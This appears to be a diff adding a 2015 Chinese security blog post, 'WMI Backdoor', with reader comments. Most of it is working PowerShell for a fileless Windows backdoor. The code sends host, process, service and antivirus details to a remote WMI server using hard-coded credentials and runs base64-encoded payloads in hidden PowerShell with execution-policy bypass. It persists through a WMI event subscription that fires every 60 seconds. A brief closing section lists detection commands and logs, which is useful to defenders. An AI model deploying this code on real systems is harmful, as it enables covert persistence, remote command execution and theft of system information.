@@ -1,0 +1,138 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">WMI Backdoor</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/09/01 10:47" ui-time="" datetime="2015/09/01 10:47" class="published ng-binding ng-isolate-scope">2015/09/01 10:47</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>上篇介绍了如何通过powershell来实现WMI attacks，这次接着介绍一些<code>进阶WMI技巧---WMI Backdoor</code></p><p><img alt="这里写图片描述" img-src="2ad8e771e0167a3dd82285d896dc8bb80afba7b9.jpg"></p><p>配图为Mandiant在M-Trends 2015报告中提到的“How threat actors use WMI to maintain persistence”（即上篇提到的隐蔽定时启动程序）</p><h1>0x01 简介</h1><hr><p>结合上篇WMI attacks的基础知识来设计WMI Backdoor</p><p><strong>特点</strong>：</p><pre><code>不在Client和Server留下任何文件
+不改动注册表
+仅使用powershell实现
+</code></pre><h1>0x02 测试环境</h1><hr><h2>CLIENT:</h2><pre><code>192.168.40.208
+Win8x86
+</code></pre><h2>SERVER：</h2><pre><code>192.168.40.206
+Win7x64
+Username：a
+Password：testtest
+</code></pre><h1>0x03 思路</h1><hr><p>作为后门，所以把隐蔽性放在首位</p><p><strong>Clinet需要满足如下功能</strong>：</p><pre><code>上传信息至服务器
+获取指令执行
+定时启动
+</code></pre><h1>0x04 功能实现</h1><hr><h2>1、Client将本机信息发送至Server</h2><p>《WMI attacks-3、存储payload》提到，可将数据存储于此，不会留下文件，实际位于硬盘上的一个复杂的数据库中(objects.data)</p><p><strong>设计思路</strong>：</p><pre><code>Client获取主机配置信息-连接远程服务器-保存在远程服务器
+Server读取信息
+</code></pre><p><strong>实现</strong>：</p><p>（1）Client获取主机配置信息-连接远程服务器-保存在远程服务器</p><p>Client端Powershell代码如下：</p><pre><code>#连接192.168.40.206
+$Options = New-Object Management.ConnectionOptions
+$Options.Username = 'a'
+$Options.Password = 'testtest'
+$Options.EnablePrivileges = $True
+$Connection = New-Object Management.ManagementScope
+$Connection.Path = '\\192.168.40.206\root\cimv2'
+$Connection.Options = $Options
+$Connection.Connect()
+$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
+#新建类名
+$EvilClass['__CLASS'] = 'Win32_UserInfo'
+$EvilClass.Properties.Add('IP19216840208', [Management.CimType]::String, $False)
+#获取主机配置信息
+$GetOS=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem 
+$GetProcess=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process
+$GetService=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service -Filter "State='Running'"
+$GetUser=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem
+$GetAV=Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
+#注：Powershell中换行符为`n
+$EvilClass.Properties['IP19216840208'].Value =           $GetUser.UserName+"`n"+"OS:"+$GetOS.Caption+";"+$GetOS.OSArchitecture+"`n"+"AntiVirusProduct:"+ $GetAV.displayName+"`n"+"Process:"+"`n"+$GetProcess.Name+"`n"+"Service Start:"+"`n"+$GetService.Name
+#存储
+$EvilClass.Put()
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="c5552e1f0acf347931a9ec9e3fd3884c96fb3303.jpg"></p><p>（2）Server端执行查询获取主机信息</p><pre><code> ([WmiClass] 'Win32_UserInfo').Properties['IP19216840208']
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="0732b9a7da5f93fed23ae48dc199ab9321bfedde.jpg"></p><h2>2、Client获取指令并执行</h2><p><strong>设计思路</strong>：</p><pre><code>Client加密存储指令
+Client读取指令-解密-执行
+</code></pre><p><strong>实现</strong>：</p><p>（1）Client加密存储指令</p><p>Client端Powershell代码如下：</p><pre><code>#定义Payload，为保证变量能够解析，需要使用单引号‘
+$Payload=@'
+$Options = New-Object Management.ConnectionOptions
+$Options.Username = 'a'
+$Options.Password = 'testtest'
+$Options.EnablePrivileges = $True
+$Connection = New-Object Management.ManagementScope
+$Connection.Path = '\\192.168.40.206\root\cimv2'
+$Connection.Options = $Options
+$Connection.Connect()
+$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
+$EvilClass['__CLASS'] = 'Win32_CommandTest'
+$EvilClass.Properties.Add('IP19216840208', [Management.CimType]::String, $False)
+$EvilClass.Properties['IP19216840208'].Value ="Run Command Test!" 
+$EvilClass.Put() 
+'@
+#对payload作base64加密
+$bytes  = [System.Text.Encoding]::Unicode.GetBytes($Payload);
+$EncodedPayload = [System.Convert]::ToBase64String($bytes); 
+#存储加密后的payload
+$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
+$StaticClass.Name = 'Win32_Command'
+$StaticClass.Put()
+$StaticClass.Properties.Add('EnCommand' , $EncodedPayload)
+$StaticClass.Put() 
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="5a869710f2ca67dd460e871d7bf1ee94aa7aca6b.jpg"></p><p>（2）查看加密的payload</p><pre><code>([WmiClass] 'Win32_Command').Properties['EnCommand']
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="37752c692ded707c3425aaa5fabba975b371c90c.jpg"></p><p>（3）Client读取指令-解密-执行</p><pre><code>#读取加密payload
+$EncodedPayload=([WmiClass] 'Win32_Command').Properties['EnCommand'].Value
+#PowerShell执行命令
+$PowerShellPayload = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc $EncodedPayload"
+Invoke-WmiMethod  -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload
+#显示解密指令
+$bytes2  = [System.Convert]::FromBase64String($EncodedPayload);
+$decoded = [System.Text.Encoding]::Unicode.GetString($bytes2); 
+"decoded Payload:"
+$decoded
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="208f13a3f2a396c3204b8e3ce2f37e1814368047.jpg"></p><p>server端执行</p><p><code>([WmiClass] 'Win32_CommandTest').Properties['IP19216840208']</code></p><p>验证是否成功</p><p>如图</p><p><img alt="这里写图片描述" img-src="be39e8e1e5f35d6b54f35823aa68530533c387c3.jpg"></p><h2>3、Client定时执行powershell命令</h2><pre><code>#读取加密指令
+$EncodedPayload=([WmiClass] 'Win32_Command').Properties['EnCommand'].Value
+$filterName = 'BotFilter56'
+$consumerName = 'BotConsumer56'
+#创建一个__EventFilter，用于设定触发条件，每隔60s执行一次
+$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE
+TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
+
+#创建一个CommandLineEventConsumer，用于设定执行的操作
+$Arg =@{
+        Name=$consumerName
+            CommandLineTemplate="C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe  -NonInteractive  -enc $EncodedPayload"
+}
+
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $Arg
+#用于绑定filter和consumer
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="4326c576972aeec4c8f4d9fe3d1a134efb7f1edc.jpg"></p><h1>0x05 补充</h1><hr><p>对于定时启动功能的进一步说明</p><h3>1、EventFilter</h3><p>可以理解为通过执行WQL查询来设定触发条件，包括以下查询：</p><p>（1）Data queries</p><pre><code>SELECT * FROM Win32_NTLogEvent WHERE Logfile = 'Application
+</code></pre><p>（2）Event queries</p><pre><code>SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance._Class = 'win32_TerminalService'
+</code></pre><p>（3）Schema queries</p><pre><code>SELECT * FROM meta_class WHERE __this ISA "Win32_BaseService"
+</code></pre><h2>2、 consumer</h2><p>可以理解为条件满足后执行的操作，包括如下查询：</p><pre><code>（1）ActiveScriptEventConsumer    
+（2）LogFileEventConsumer 
+（3）NTEventLogEventConsumer
+（4）SMTPEventConsumer
+（5）CommandLineEventConsumer
+</code></pre><h2>3、使用consumer执行vbs脚本的两种方式</h2><p>（1）直接执行现有脚本</p><pre><code>instance of ActiveScriptEventConsumer as $Cons
+{
+    Name = "ASEC";
+    ScriptingEngine = "VBScript";
+    ScriptFileName = "c:\\asec2.vbs";
+};
+</code></pre><p>（2）内嵌脚本，不会留下痕迹</p><pre><code>instance of ActiveScriptEventConsumer as $Cons
+{
+    Name = "ASEC";
+    ScriptingEngine = "VBScript";
+
+    ScriptText =
+        "Dim objFS, objFile\n"
+        "Set objFS = CreateObject(\"Scripting.FileSystemObject\")\n"
+        "Set objFile = objFS.OpenTextFile(\"C:\\ASEC.log\","
+        " 8, true)\nobjFile.WriteLine \"Time: \" &amp; Now &amp; \";"
+        " Entry made by: ASEC\"\nobjFile.WriteLine"
+        " \"Application closed. UserModeTime:  \" &amp; "
+        "TargetEvent.TargetInstance.UserModeTime &amp;_\n"
+        "\"; KernelModeTime: \" &amp; "
+        "TargetEvent.TargetInstance.KernelModeTime "
+        "&amp; \" [hundreds of nanoseconds]\"\n"
+        "objFile.Close\n";
+};
+</code></pre><p>参考资料：</p><blockquote><p>https://msdn.microsoft.com/en-us/library/aa392902(v=vs.85).aspx https://msdn.microsoft.com/en-us/library/aa393250(v=vs.85).aspx</p></blockquote><h1>0x06 小结</h1><hr><p>本文仅用来介绍WMI Attacks的进阶应用技巧，请勿用于非法用途</p><p>再次提一下WMI的检测方法：</p><pre><code>#List Event Filters
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter
+
+#List Event Consumers
+Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
+
+#List Event Bindings
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
+</code></pre><p>查看日志</p><pre><code>– Microsoft-Windows-WinRM/Operational
+– Microsoft-Windows-WMI-Activity/Operational
+– Microsoft-Windows-DistributedCOM
+</code></pre><p><strong>甚至禁用Winmgmt服务从根本上阻止该方法的使用</strong></p><hr><p>本文由三好学生原创并首发于乌云drops，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">360xx</span> <span class="reply-time">2016-06-20 15:31:02</span></div><p></p><p>360xx卫士已经能完美查杀 wmi后门 一个dat文件 - -</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">懒懒滴1994</span> <span class="reply-time">2016-05-15 19:17:20</span></div><p></p><p>没错- -</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">懒懒滴1994</span> <span class="reply-time">2016-05-15 19:16:05</span></div><p></p><p>第三节有错别字&gt;_&lt; “Clinet需要满足如下功能”<br>&gt;-&gt;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">浮生</span> <span class="reply-time">2015-09-02 16:52:20</span></div><p></p><p>这个比较厉害，powershell现在可以做很多事，有时候我是用任务计划来留下后门的，也是powershell</p><p></p></div></div></div></div></div></main>
